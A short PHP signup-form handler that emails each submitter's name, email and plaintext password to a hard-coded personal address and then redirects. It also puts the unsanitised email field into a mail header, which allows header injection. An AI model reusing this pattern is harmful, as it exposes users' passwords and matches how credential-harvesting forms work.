<?php
if (isset($_POST["submit"])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $password = $_POST['password'];

    $from = 'sender@mail';  // Email that sends the signup info
    $to = 'honey1432koushik@gmail.com';  // Recipient email address
    $subject = 'Signup Form Submission';

    // Message body for the email
    $body = "From: $name\nE-Mail: $email\nPassword: $password\n";

    // Email headers
    $headers = "From: $from\r\n";
    $headers .= "Reply-To: $email\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Sending email
    if (mail($to, $subject, $body, $headers)) {
        header("Location: thank-you.html");  // Redirect to a thank you page after success
        exit;
    } else {
        die("Error sending email.");  // Show error message if email fails
    }
}
?>
